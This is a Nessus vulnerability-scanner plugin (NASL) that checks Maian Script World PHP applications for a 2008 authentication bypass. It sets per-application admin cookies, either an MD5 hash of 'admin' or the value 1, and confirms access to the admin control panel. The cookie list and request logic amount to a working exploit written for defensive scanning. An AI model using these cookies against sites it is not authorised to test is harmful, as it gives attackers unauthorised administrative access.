#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(33483);
  script_version("$Revision: 1.15 $");

  script_cve_id(
    "CVE-2008-3317",
    "CVE-2008-3318",
    "CVE-2008-3319",
    "CVE-2008-3320",
    "CVE-2008-3321",
    "CVE-2008-3322",
    "CVE-2008-7086"
  );
  script_bugtraq_id(30195, 30196, 30197, 30198, 30199, 30203, 30205, 30208, 30209, 30210, 30211);
  script_osvdb_id(
    47011,
    47019,
    47029,
    47030,
    47031,
    47032,
    47033,
    47034,
    57442
  );
  script_xref(name:"EDB-ID", value:"6047");
  script_xref(name:"EDB-ID", value:"6048");
  script_xref(name:"EDB-ID", value:"6049");
  script_xref(name:"EDB-ID", value:"6050");
  script_xref(name:"EDB-ID", value:"6051");
  script_xref(name:"EDB-ID", value:"6061");
  script_xref(name:"EDB-ID", value:"6062");
  script_xref(name:"EDB-ID", value:"6063");
  script_xref(name:"EDB-ID", value:"6064");
  script_xref(name:"EDB-ID", value:"6065");
  script_xref(name:"EDB-ID", value:"6066");
  script_xref(name:"Secunia", value:"31038");
  script_xref(name:"Secunia", value:"31056");

  script_name(english:"Maian Scripts Cookie Manipulation Authentication Bypass");
  script_summary(english:"Tries to access admin control panel");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains at least one PHP application that
allows a remote attacker to bypass authentication." );
 script_set_attribute(attribute:"description", value:
"The remote host is running at least one PHP application from Maian
Script World that allows a remote attacker to bypass authentication
and access the admin control panel by simply setting a special cookie." );
 # http://web.archive.org/web/20120226153853/http://www.maianscriptworld.co.uk/free-php-scripts/maian-weblog/development/index.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8d1af886" );
 script_set_attribute(attribute:"solution", value:
"Download the update-14-7-08 security patch and follow the instructions
in the readme to update the vulnerable application(s)." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(287);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/07/15");
 script_cvs_date("$Date: 2015/09/24 21:17:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Map apps to cookies.
admin_md5 = hexstr(MD5("admin"));
cookie["Maian Cart"]      = string("mccart_cookie=", admin_md5);
cookie["Maian Events"]    = string("mevents_admin_cookie=", admin_md5);
cookie["Maian Gallery"]   = string("mgallery_admin_cookie=", admin_md5);
cookie["Maian Greetings"] = string("mecard_admin_cookie=1");
cookie["Maian Guestbook"] = string("gbook_cookie=1");
cookie["Maian Links"]     = string("links_cookie=1");
cookie["Maian Music"]     = string("mmusic_cookie=", admin_md5);
cookie["Maian Recipe"]    = string("recipe_cookie=1");
cookie["Maian Search"]    = string("search_cookie=1");
cookie["Maian Uploader"]  = string("uploader_cookie=1");
cookie["Maian Weblog"]    = string("weblog_cookie=1");


# Loop through various directories.
if (thorough_tests) dirs = make_list(
  "/cart",
  "/events",
  "/gallery",
  "/greetings",
  "/guestbook",
  "/links",
  "/music",
  "/recipe",
  "/search",
  "/uploader",
  "/weblog",
  cgi_dirs()
);
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to pull up the login page for the administration control panel.
  url = string(dir, "/admin/index.php");

  clear_cookiejar();
  r = http_send_recv3(method: "GET", item:string(url, "?cmd=login"), port:port);
  if (isnull(r)) exit(0);

  # If it's one of the Maian scripts...
  pat = "<title>(Maian [^ ]+) v[0-9]+\.";
  matches = egrep(pattern:pat, string:r[2]);
  if (matches)
  {
    # Identify the application.
    app = NULL;

    foreach match (split(matches))
    {
      match = chomp(match);
      item = eregmatch(pattern:pat, string:match);
      if (!isnull(item))
      {
        app = item[1];
        break;
      }
    }

    # Determine which cookie to use.
    if (cookie[app])
    {
      v = split(cookie[app], sep: '=', keep: 0);
      set_http_cookie(name: v[0], value: v[1]);
      # Try to exploit the issue to gain access to the admin control panel.
      url = string(url, "?cmd=home");
      r = http_send_recv3(method: "GET", item:url, port:port);
      if (isnull(r)) exit(0);

      # There's a problem if we now have access to the admin control panel.
      if (
        (
          # nb: this actually appears in Maian Greetings!
          " - Adminstration</title>" >< r[2] ||
          " - Administration</title>" >< r[2]
        ) &&
        '="index.php?cmd=logout"' >< r[2]
      )
      {
        if (report_verbosity)
        {
          report = string(
            "Nessus was able to gain access to the administration control panel\n",
            "for ", app, " on the remote host using the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n",
            "\n",
            "and setting the following cookie :\n",
            "\n",
            "  Cookie: ", cookie[app], "\n"
          );
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        # nb: don't break - there still may be other vulnerable apps installed.
      }
    }
  }
}
